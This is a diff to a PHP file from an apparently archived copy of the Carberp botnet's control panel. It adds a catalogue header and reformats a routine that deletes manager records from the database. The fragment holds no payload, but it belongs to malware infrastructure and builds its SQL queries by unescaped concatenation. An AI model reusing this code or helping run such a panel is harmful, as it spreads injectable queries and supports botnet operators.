@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 $smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
 $parent = $mysqli->query('SELECT * from bf_manager WHERE id = '.$Cur['id'].' LIMIT 1');
@@ -5,8 +16,10 @@ $parent = $mysqli->query('SELECT * from bf_manager WHERE id = '.$Cur['id'].' LIM
 if(!empty($parent->id)){
 	if(empty($parent->host)){
 		if(isset($_POST['yes'])){
-			if($parent->parent_id == 0){				$sql = 'delete from bf_manager WHERE (parent_id LIKE \''.$parent->id.'|%\') OR (id = \''.$parent->id.'\')';
-			}else{				$sql = 'delete from bf_manager WHERE (parent_id LIKE \'%|'.$parent->id.'|%\') OR (id = \''.$parent->id.'\')';
+			if($parent->parent_id == 0){
+				$sql = 'delete from bf_manager WHERE (parent_id LIKE \''.$parent->id.'|%\') OR (id = \''.$parent->id.'\')';
+			}else{
+				$sql = 'delete from bf_manager WHERE (parent_id LIKE \'%|'.$parent->id.'|%\') OR (id = \''.$parent->id.'\')';
 			}
 			$mysqli->query($sql);
             $smarty->assign("save", true);
